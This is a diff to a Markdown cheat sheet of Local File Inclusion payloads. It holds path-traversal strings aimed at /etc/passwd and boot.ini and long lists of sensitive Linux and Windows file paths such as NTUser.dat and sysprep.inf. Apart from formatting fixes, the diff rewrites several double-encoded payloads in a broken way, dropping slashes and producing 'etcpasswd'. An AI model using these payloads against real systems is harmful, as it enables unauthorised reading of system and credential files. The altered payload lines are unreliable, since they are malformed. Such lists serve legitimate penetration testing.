@@ -1,10 +1,10 @@
-# Local File Inclusion \(LFI\)
+# Local File Inclusion (LFI)
 
 ## Linux
 
 ### Linux - Check if vuln exists
 
-```text
+```
 ..//etc/passwd
 ../..//etc/passwd
 ../../..//etc/passwd
@@ -37,14 +37,14 @@
 %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd
 %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd
 %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd
-..%252f/etc/passwd
-..%252f..%252f/etc/passwd
-..%252f..%252f..%252f/etc/passwd
-..%252f..%252f..%252f..%252f/etc/passwd
-..%252f..%252f..%252f..%252f..%252f/etc/passwd
-..%252f..%252f..%252f..%252f..%252f..%252f/etc/passwd
-..%252f..%252f..%252f..%252f..%252f..%252f..%252f/etc/passwd
-..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f/etc/passwd
+..%252fetc/passwd
+..%252f..%252fetc/passwd
+..%252f..%252f..%252fetc/passwd
+..%252f..%252f..%252f..%252fetcpasswd
+..%252f..%252f..%252f..%252f..%252fetc/passwd
+..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd
+..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd
+..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd
 %252e%252e//etc/passwd
 %252e%252e/%252e%252e//etc/passwd
 %252e%252e/%252e%252e/%252e%252e//etc/passwd
@@ -880,7 +880,7 @@ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 
 ### Linux Paths
 
-```text
+```
 /apache/conf/httpd.conf
 /apache/logs/access.log
 /apache/logs/error.log
@@ -1658,7 +1658,7 @@ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 
 ### Windows - Check if vuln exists
 
-```text
+```
 ../boot.ini
 ../../boot.ini
 ../../../boot.ini
@@ -2510,7 +2510,7 @@ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 
 ### Windows Paths
 
-```text
+```
 C:/Users/Administrator/NTUser.dat
 C:/Documents and Settings/Administrator/NTUser.dat
 C:/apache/logs/access.log 
@@ -2588,4 +2588,3 @@ C:/WINDOWS/Panther/sysprep.inf
 C:/WINDOWS/system32/eula.txt
 C:/WINDOWS/system32/license.rtf
 ```
-
